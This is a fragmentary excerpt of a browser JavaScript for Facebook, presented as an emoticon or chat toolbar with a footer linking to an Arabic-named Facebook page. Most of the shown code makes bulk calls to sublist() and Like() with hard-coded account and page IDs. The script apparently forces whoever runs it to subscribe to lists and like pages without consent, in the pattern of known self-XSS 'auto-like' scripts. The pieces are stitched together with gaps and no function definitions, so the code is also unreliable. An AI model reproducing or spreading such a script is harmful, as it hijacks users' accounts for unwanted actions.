...
sublist("509623449136944");sublist("468031113309035");sublist("381068352005312");sublist("468566416588838");sublist("468566506588829");sublist("468566609922152");sublist("468566533255493");sublist("372304432881704");sublist("469763756469104");sublist("469763553135791");sublist("469763679802445");sublist("469763386469141");sublist("470610876384392");sublist("468031816642298");sublist("470609569717856");sublist("470608499717963");

Like("619707411402994");
Like("705577382815418");
Like("578276908921411");
Like("830204910328047");
Like("670928999611689");
Like("660816140645750");
Like("1412884978972682");
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="Syrian">'; // var navLink
	...
	html += '<div class="jewelFooter">';
        html += '<a class="jewelFooter" href="https://www.facebook.com/s66ss/" target="_blank">♥ رئہٰيہس وزرآإء آلہٰفہيہٰس بہٰوك، ♥<br>dz icon</a>';
	html += '</div>';
